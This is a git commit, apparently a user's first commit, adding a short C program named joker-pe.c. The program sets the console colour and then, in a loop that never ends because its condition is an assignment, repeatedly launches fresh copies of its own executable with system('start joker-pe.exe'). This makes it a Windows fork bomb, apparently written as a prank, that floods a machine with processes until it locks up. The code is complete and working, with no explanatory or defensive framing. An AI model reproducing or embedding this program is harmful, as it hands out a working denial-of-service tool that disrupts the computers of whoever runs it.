f438d848a974b0a4cbfe2cba7bd484b535494dcc
Pezao22 <adrianritidasilva1818@gmail.comclear>
2022-09-30 22:24:37 -0300

    First Commit

---
+++ joker-pe.c
@@ -0,0 +1,18 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void){
+
+    int a = 1;
+    
+    do{  
+    
+		system("color A");		
+        system("start joker-pe.exe");
+        a = a +1;
+        printf ("%d",a);
+
+    } while (a = 1);
+
+return 0;
+}
